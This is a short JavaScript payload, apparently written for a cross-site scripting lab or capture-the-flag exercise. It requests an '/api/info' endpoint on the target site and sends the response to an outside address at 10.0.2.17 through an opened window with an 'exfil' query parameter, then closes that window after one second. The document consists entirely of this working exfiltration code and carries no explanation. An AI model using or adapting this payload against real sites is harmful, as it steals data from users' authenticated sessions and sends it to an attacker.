var xhr = new XMLHttpRequest();
xhr.onreadystatechange = () =>{
        if(xhr.readyState == XMLHttpRequest.DONE){
                openwindow = window.open("http://10.0.2.17/?exfil=" + xhr.response);
                setTimeout(()=>openwindow.close(),1000)
        }
};
xhr.open('GET',"https://guitjapeo.thl/api/info",false);
xhr.send();
